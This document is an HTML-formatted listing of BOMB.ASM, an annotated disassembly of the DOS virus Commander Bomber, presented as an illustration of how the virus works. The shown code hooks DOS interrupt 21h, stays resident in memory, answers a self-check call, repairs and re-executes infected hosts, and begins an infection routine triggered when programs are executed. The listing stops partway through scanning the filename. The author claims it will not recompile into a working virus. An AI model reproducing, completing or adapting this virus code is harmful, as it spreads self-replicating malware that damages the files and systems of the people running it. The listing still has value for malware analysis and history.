<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>BOMB.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment ~</span><span class="sc0">
</span><span class="sc1">;        Hi dudes, just for your information, this dizastering</span><span class="sc0">
</span><span class="sc1">;        of famous COMMANDER.BOMBER virus is not designed for</span><span class="sc0">
</span><span class="sc1">;        recompilation ( you know, I am such a lazy bastard, so</span><span class="sc0">
</span><span class="sc1">;        i didn't take care about relocations and so), or better</span><span class="sc0">
</span><span class="sc1">;        after compilation you 'll not get working virus. :((((</span><span class="sc0">
</span><span class="sc1">;        Actually, this is dizassembly of virus memory dump.</span><span class="sc0">
</span><span class="sc1">;        It should just ilustrate how this virus works and why</span><span class="sc0">
</span><span class="sc1">;        wasn't so much in the wild as it's foreruners.</span><span class="sc0">
</span><span class="sc1">; ~</span><span class="sc0">








</span><span class="sc5">seg000</span><span class="sc0">      </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg000</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg000</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">loc_0_103</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">

</span><span class="sc5">m_CommanderBomb</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'COMMANDER BOMBER WAS HERE'</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; get old interrpt adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old_int_21</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old_int_21</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_int_21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; set our vector</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_random_se</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">2Ch</span><span class="sc0">  </span><span class="sc1">; DS = enviroment segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">seg000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - 2+ - FREE MEMORY</span><span class="sc0">
                    </span><span class="sc1">; ES = segment address of area to be freed</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - 2+ - ADJUST MEMORY BLOCK SIZE (SETBLOCK)</span><span class="sc0">
                    </span><span class="sc1">; ES = segment address of block to change</span><span class="sc0">
                    </span><span class="sc1">; BX = new size in paragraphs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exec_parameters</span><span class="sc0">
                                        </span><span class="sc1">; BX point to   exec parameter block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">   </span><span class="sc1">; set pointer 2 comand line</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">   </span><span class="sc1">; set pointer 2 FCB1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">; set pointer 2 FCB2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; reexec infected file, but with virus</span><span class="sc0">
                    </span><span class="sc1">; in memory</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">go_TSR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Dh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - 2+ - GET EXIT CODE OF SUBPROGRAM (WAIT)</span><span class="sc0">

</span><span class="sc5">go_TSR</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - DOS 2+ - TERMINATE BUT STAY RESIDENT</span><span class="sc0">

</span><span class="sc5">exec_parameters</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; enviroment segment</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; dw pointer 2 cmnd line</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10Bh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">5Ch</span><span class="sc0">          </span><span class="sc1">; dw pointer 2 fcb1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10Bh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc0">          </span><span class="sc1">; dw pointer 2 fcb2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10Bh</span><span class="sc0">

</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">; si now holds delta offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">      </span><span class="sc1">; cs=ds=es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A5F3h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; CS:FC F3 A5 repz movsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FEBh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; CS:FE EB 1F jmp 11F</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">     </span><span class="sc1">; the code above moves virus to ds:100</span><span class="sc0">
                    </span><span class="sc1">; and jumps to ds:11f - virus gets</span><span class="sc0">
                    </span><span class="sc1">; installed</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - GET DOS VERSION</span><span class="sc0">
                    </span><span class="sc1">; Return: AL = major version number (00h for DOS 1.x)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">DOS_under_3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; push delta</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; PSP:2C holds enviroment segment</span><span class="sc0">

</span><span class="sc5">look_4_end</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; look 4 end of enviroment</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">look_4_end</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; BP points now to EXEC string</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; pop  delta again</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'BO'</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; ARE YOU HERE call</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MB'</span><span class="sc0">        </span><span class="sc1">; notice BO-MB !</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_in_memory</span><span class="sc0">

</span><span class="sc5">in_memory</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; here comes code, if the virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">      </span><span class="sc1">; is resident</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; open host for r/w</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">DOS_under_3</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; get time/date</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; store date</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; store time</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9C0h</span><span class="sc0">    </span><span class="sc1">; point to end of virus</span><span class="sc0">

</span><span class="sc5">look_4_ff_0</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; di on start = 0</span><span class="sc0">
                    </span><span class="sc1">; FORMAT of repair table</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ff_found</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; from ds:si to es:di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">look_4_ff_0</span><span class="sc0">

</span><span class="sc5">ff_found</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">   </span><span class="sc1">; size of stored fragment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">110h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; add size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - 2+ - WRITE TO FILE WITH HANDLE</span><span class="sc0">
                    </span><span class="sc1">; BX = file handle, CX = number of bytes to write, DS:DX -&gt; buffer</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; truncate file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; set original time/date</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">DOS_under_3</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BC0h</span><span class="sc0">

</span><span class="sc5">look_4_ff_1</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">zero_bytes</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">look_4_ff_1</span><span class="sc0">

</span><span class="sc5">zero_bytes</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0"> </span><span class="sc1">; ¾     ; MOV SI,W</span><span class="sc0">
</span><span class="sc5">file_size</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1400h</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">not_in_memory</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">800h</span><span class="sc0">    </span><span class="sc1">; prepare for 4 K block move</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">; this code  returns to repz movsw/jmp 11f</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">read_2_buffer</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61184</span><span class="sc0">   </span><span class="sc1">; maximal size 2 infect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">

</span><span class="sc5">emulate_int_21</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">jmp_old_21</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">virus_int_21</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">try_to_infect</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'BO'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">are_you_here_?</span><span class="sc0">

</span><span class="sc5">jmp_old_21</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0"> </span><span class="sc1">; ê     ; ...</span><span class="sc0">
</span><span class="sc5">old_int_21</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2140EBh</span><span class="sc0">      </span><span class="sc1">; ...</span><span class="sc0">

</span><span class="sc5">are_you_here_?</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MB'</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">try_to_infect</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saved_sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">seg000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; setup own stack frame</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">scan_filename</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
